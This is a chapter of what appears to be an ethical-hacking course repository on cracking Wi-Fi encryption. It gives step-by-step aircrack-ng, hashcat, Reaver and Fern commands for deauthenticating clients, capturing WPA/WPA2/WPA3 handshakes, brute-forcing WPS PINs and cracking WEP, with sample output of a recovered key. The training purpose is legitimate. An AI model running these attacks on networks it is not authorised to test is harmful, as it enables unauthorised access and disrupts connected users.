# 09 — Wi-Fi Encryption Cracking

> Objective 4 of the module (Step 4 of 5): *Demonstrate Wireless Hacking Methodology — Wi-Fi Encryption Cracking*

## Table of Contents
- [Overview](#overview)
- [WPA/WPA2 Encryption Cracking — Concepts](#wpawpa2-encryption-cracking--concepts)
- [Cracking WPA/WPA2 Using Aircrack-ng](#cracking-wpawpa2-using-aircrack-ng)
- [Additional WPA/WPA2 Cracking Tools](#additional-wpawpa2-cracking-tools)
- [WPA Brute Forcing Using Fern Wifi Cracker](#wpa-brute-forcing-using-fern-wifi-cracker)
- [WPA3 Encryption Cracking](#wpa3-encryption-cracking)
- [Cracking WPA3 Using Aircrack-ng and hashcat](#cracking-wpa3-using-aircrack-ng-and-hashcat)
- [Cracking WPS Using Reaver](#cracking-wps-using-reaver)
- [Supplementary: Cracking WEP](#supplementary-cracking-wep)

---

## Overview

After an attacker succeeds in obtaining unauthorized access to a target network through methods such as wireless attacks, rogue APs, and evil twins, the attacker must **crack the security imposed by the target wireless network**. Generally, for securing wireless communication, Wi-Fi networks use WEP/WPA/WPA2/WPA3 encryption, which the attacker must crack. This is Step 4 of the wireless hacking methodology — the step that actually turns "I can see this network" into "I have its password."

## WPA/WPA2 Encryption Cracking — Concepts

WPA encryption is less exploitable than WEP encryption; however, an attacker can still crack it by capturing the necessary type of packets. This is done **offline** — the attacker needs to be near the AP for only a few moments. Four core techniques:

| Technique | Description |
|---|---|
| **WPA PSK** | Uses a user-defined password to initialize the four-way handshake. The password is a per-packet key and can't be directly reversed, but the keys **can be brute-forced using dictionary attacks** — a dictionary attack can compromise most consumer passwords. |
| **Offline Attack** | An attacker only needs to be near the AP for a matter of seconds to capture the WPA/WPA2 authentication handshake. In WPA handshakes, the password itself is never sent across the network — the handshake occurs over insecure channels, in plaintext, but the password is never directly transmitted. Capturing a full authentication handshake from a client and the AP is enough to attempt breaking the encryption offline, with no further packet injection needed. |
| **De-authentication Attack** | To crack WPA, the attacker needs an actively connected client. Force the client to disconnect from the AP (deauth), then use tools like `aireplay-ng` to capture the re-connect/re-authentication packets, which include the **Pairwise Master Key (PMK)**. The client re-authenticates within seconds, and the attacker can then dictionary/brute-force the captured PMK to recover the WPA key. |
| **Brute-Force WPA Keys** | Brute-force is compute-intensive but effective. Tools: `aircrack` and `aireplay`. Breaking WPA keys via brute force can take **hours, days, or even weeks**, depending on password complexity and wordlist quality. |

## Cracking WPA/WPA2 Using Aircrack-ng

This is the module's flagship practical workflow — five commands, one full handshake capture, one crack.

```bash
# ── Step 1: Monitor mode ──────────────────────────────────────────────
airmon-ng start wlx00e02d886189
# Note: if this reports 2+ processes that could cause trouble, run:
airmon-ng check kill

# ── Step 2: List detected access points ───────────────────────────────
airodump-ng wlx00e02d886189
# Locate your target's BSSID / channel / ESSID in the output, e.g.:
#   22:7F:AC:6D:E6:8B   CH 11   WPA2 CCMP PSK   ECC Labs

# ── Step 3: Capture packets from the target AP only (leave running) ───
airodump-ng --bssid 22:7F:AC:6D:E6:8B -c 1 -w ECCLabs wlx00e02d886189

# ── Step 4: Deauth a connected client to force a fresh handshake ──────
aireplay-ng -0 11 -a 22:7F:AC:6D:E6:8B -c EE:AB:46:A7:CF:18 wlx00e02d886189

# ── Step 5: Crack the captured .cap file against a wordlist ───────────
aircrack-ng -a2 22:7F:AC:6D:E6:8B -w password.txt ECCLabs-01.cap
```

**Result:**
```
Aircrack-ng 1.7

[00:00:00] 8/16 keys tested (1201.02 k/s)
Time left: 0 seconds                                       50.00%

                     KEY FOUND! [ 12345678 ]

Master Key     : FC 10 E3 F5 82 C1 B2 EE 27 24 FB 5D 64 89 F0 AA
                 71 25 63 9E 16 E4 EC 32 E4 B8 56 C2 48 3C 65 3A
Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 ...
EAPOL HMAC     : 25 24 85 29 CA 4E 23 05 D8 69 ED CD 0F 98 C8 2F
```

**Command reference:**
| Command / Flag | Meaning |
|---|---|
| `airmon-ng start <iface>` | Puts the adapter into monitor mode |
| `airmon-ng check kill` | Kills competing processes (`NetworkManager`, `wpa_supplicant`) that would otherwise fight for the interface |
| `airodump-ng <iface>` | Lists all visible BSSIDs/clients |
| `--bssid <BSSID> -c <channel> -w <name>` | Locks capture to one AP, one channel, writes to `<name>-NN.cap` |
| `aireplay-ng -0 <n> -a <AP> -c <client>` | Sends `n` deauth frames to force a fresh 4-way handshake |
| `aircrack-ng -a2 -w <wordlist> <capfile>` | `-a2` selects WPA/WPA2 attack mode; cracks the captured handshake against the wordlist |

> **Why this works:** the WPA/WPA2 4-way handshake (see `03-wireless-encryption-wep-wpa-wpa2-wpa3.md`) is derived from the PSK + SSID + nonces + MAC addresses. Once you have all four messages of a handshake captured in a `.cap` file, you can test candidate passwords **completely offline**, with no further interaction with the AP — this is why capturing the handshake, not "breaking encryption in the air," is the real objective of steps 1–4 above.

## Additional WPA/WPA2 Cracking Tools

| Tool | Source |
|---|---|
| **hashcat** | https://hashcat.net |
| **EAPHammer** | https://github.com |
| **Portable Penetrator** | https://www.secpoint.com |
| **WepCrackGui** | https://sourceforge.net |
| **Wifite** | https://github.com |

## WPA Brute Forcing Using Fern Wifi Cracker

**Source:** https://github.com

Fern Wi-Fi Cracker is a wireless security auditing and attack tool written in Python with a Python-Qt GUI. It can crack and recover **WPA/WPS** keys and run other network-based attacks on wireless or Ethernet networks.

**Steps:**
1. Run `sudo fern-wifi-cracker` to start the tool.
2. Enable **Monitor Mode** by selecting the Wi-Fi adapter from the drop-down menu and clicking **"Monitor Mode."**
3. Click **"Scan for Access Points"** and select a target **WPA/WPA2** network from the discovered list.
4. Click **"Attack"** next to the target network to initiate a de-authentication attack, forcing a connected client to reconnect and capturing the WPA handshake in the process.
5. The tool notifies you once it successfully captures a WPA handshake.
6. Choose a **wordlist** file with candidate passwords to try against the captured handshake (e.g., `rockyou.txt`, typically at `/usr/share/wordlists/`).
7. Click **"Start WPA Attack."** Fern tests each password in the wordlist against the captured handshake — if found, the correct password is displayed on screen.

## WPA3 Encryption Cracking

The WPA3 Wi-Fi security standard replaces WPA2's four-way (PSK) handshake with the **Dragonfly (SAE)** handshake to supply the strongest password-based authentication to date. However, it's still vulnerable to password-cracking attacks. **Dragonblood** is the collective name for the set of vulnerabilities in WPA3 that allow attackers to recover keys, downgrade security mechanisms, and launch information-theft attacks.

**Dragonblood tooling:** Dragonslayer, Dragonforce, Dragondrain, Dragontime — purpose-built proof-of-concept tools for exploiting these specific vulnerabilities.

### Downgrade Security Attacks
Requires the client and AP to support **both WPA3 and WPA2**. The attacker forces the victim to fall back to the older, weaker WPA2 method.

- **Exploiting backward compatibility:** if a client and AP both support WPA2+WPA3, the attacker installs a rogue AP that offers **only WPA2 compatibility**, forcing the client through the (weaker) four-way handshake to connect. Once connected, the attacker can use every WPA2 attack tool covered above.
- **Exploiting the Dragonfly handshake:** the attacker masquerades as an authentic AP. When the client attempts to key-exchange via WPA3, the attacker's rogue AP claims it **doesn't support WPA3** and suggests falling back to WPA2 — after which the attacker exploits/cracks the WPA2 connection as usual.

### Side-Channel Attacks (Information-Leaking Attack)
Attackers target the protocols/encryption mechanisms used during the key-exchange process to capture leaked information, later used to launch brute-force or dictionary attacks.

- **Timing-based attack:** the attacker analyzes the *time* the Dragonfly handshake takes to encode a given password-authentication attempt, observing the number of encoding iterations to short-list likely passwords. After building a candidate list, the attacker attempts further access using standard techniques.
- **Cache-based attack:** the attacker injects malicious JavaScript or a malicious web application into the target's browser, then observes **memory access (cache) patterns** to retrieve password information directly from how the device processed it.

## Cracking WPA3 Using Aircrack-ng and hashcat

**Source:** https://github.com, https://hashcat.net

```bash
# Step 1 — monitor mode
airmon-ng start <Wireless_Interface>

# Step 2 — capture the handshake as root, in another terminal
airodump-ng wlan0mon
# Or, focused on one target:
airodump-ng --bssid <BSSID> --channel <CH> --write capture wlan0mon

# Step 3 — deauthenticate a client to force a fresh handshake
aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon

# Step 4 — convert the captured .cap to hashcat's format using hcxtools
hcxpcapngtool -o capture.hccapx <capture>.cap

# Step 5 — crack the handshake with hashcat + a wordlist
hashcat -m 22000 capture.hccapx </path/to/wordlist.txt>
```

`-m 22000` is hashcat's mode identifier for **WPA-PBKDF2-PMKID+EAPOL** (the modern combined WPA/WPA2/WPA3 handshake format that superseded the older `.hccap`/mode-2500 format). This same five-step pattern — capture, deauth, convert, crack — is exactly the WPA2 workflow above, just with hashcat's GPU-accelerated cracking swapped in for `aircrack-ng`'s CPU-based cracking, which matters because WPA3's larger key space (see the comparison table in `03-wireless-encryption-wep-wpa-wpa2-wpa3.md`) makes CPU-only brute-forcing considerably slower.

## Cracking WPS Using Reaver

**Source:** https://github.com

Reaver is designed to be a robust, practical attack tool against **Wi-Fi Protected Setup (WPS)** registrar PINs, in order to recover the underlying **WPA/WPA2 passphrase**. It has been tested against a wide variety of APs and WPS implementations. Because WPS uses an 8-digit PIN split into two halves that can be brute-forced *independently* (a well-known WPS design flaw), the effective keyspace is drastically smaller than the PIN's nominal 10⁸ combinations — which is what makes this attack practical at all.

```bash
# Step 1 — monitor mode
airmon-ng start wlan0
# (or airmon-ng <start|stop> <interface> generally)

# Step 2 — detect WPS-enabled devices
wash -i mon0
# If Wash can't find WPS-enabled devices, fall back to airodump-ng:
airodump-ng wlan0mon

# Step 3 — once you have the target's BSSID, start cracking with Reaver
reaver -i <name_of_the_monitor-mode_interface> -b <BSSID_of_target_AP> -vv
# Example:
reaver -i wlan0mon -b B4:75:0E:89:00:60 -vv
```

Reaver scans all possible WPS PINs until it finds a matching one, then begins exploitation. Sample output during a run:
```
[+] Sending WSC NACK
[!] WPS transaction failed (code: 0x04), re-trying last pin
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with 5C:64:8E:FD:8D:60 (ESSID: Airtel_Zerotouch)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received WSC NACK
...
```
Reaver alternates authentication/association/EAPOL exchanges while iterating candidate PIN halves, ultimately recovering the WPS PIN — and with it, the AP's WPA/WPA2 passphrase, **without ever needing to crack the passphrase itself.**

> **Countermeasure preview:** this is exactly why `10-wireless-countermeasures-and-wips.md` recommends disabling WPS entirely rather than relying on lockout thresholds — Reaver-class tools are specifically designed to work around rate-limiting.

## Supplementary: Cracking WEP

*(Not walked through step-by-step in the source module's Wi-Fi Encryption Cracking section — WEP's cracking mechanics were instead covered conceptually in `03-wireless-encryption-wep-wpa-wpa2-wpa3.md`. The classic practical procedure is included here for completeness, since WEP is still commonly used as a teaching example in labs and CTFs.)*

```bash
# 1. Monitor mode
airmon-ng start wlan0

# 2. Discover the target AP and channel
airodump-ng wlan0mon

# 3. Capture IVs from the target AP into a file
airodump-ng --bssid <BSSID> -c <channel> -w wep_capture wlan0mon

# 4. Associate with the AP (fake authentication) so it accepts your injected frames
aireplay-ng -1 0 -a <BSSID> wlan0mon

# 5. Force new IVs by replaying captured ARP requests (speeds up collection enormously)
aireplay-ng -3 -b <BSSID> wlan0mon

# 6. Once enough IVs are captured (commonly 20,000-80,000+), crack with aircrack-ng
aircrack-ng wep_capture-01.cap
```
This exploits exactly the WEP weaknesses catalogued in `03-wireless-encryption-wep-wpa-wpa2-wpa3.md` — the 24-bit IV space is small enough that after collecting enough packets (accelerated via ARP replay, step 5), statistical cryptanalysis (FMS/PTW attacks, built into `aircrack-ng`) recovers the key directly, no dictionary required.

---
**Previous:** [`08-rogue-ap-evil-twin-krack-advanced-attacks.md`](08-rogue-ap-evil-twin-krack-advanced-attacks.md)
**Next:** [`10-wireless-countermeasures-and-wips.md`](10-wireless-countermeasures-and-wips.md) — how to defend against everything in this repository.
